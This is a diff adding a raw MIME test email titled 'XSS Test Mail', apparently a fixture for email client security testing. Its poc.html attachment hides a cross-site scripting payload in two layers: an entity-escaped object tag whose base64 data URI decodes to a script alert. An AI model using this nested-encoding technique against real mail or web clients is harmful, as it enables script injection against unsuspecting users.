@@ -1,0 +1,26 @@
+From: r-0-730602-3334597-2-6905-us2-512b8d9c@xmr3.com
+To: bill.rapp@enron.com, vince.kaminski@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: multipart/mixed;
+	boundary="----=_Part_192061_1556421578.1563869810627"
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_192063_26965953.1563869810627"
+
+------=_Part_192063_26965953.1563869810627
+Content-Type: text/plain; charset=GBK
+Content-Transfer-Encoding: 7bit
+
+test
+
+------=_Part_192063_26965953.1563869810627--
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: text/html; name="poc.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="poc.html"
+
+Jmx0O29iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENnaVlua2dlVzl1WjNOb1lXOGlLVHd2YzJOeWFYQjBQZz09Jmd0OyZsdDsvb2JqZWN0Jmd0Ow==
+------=_Part_192061_1556421578.1563869810627--
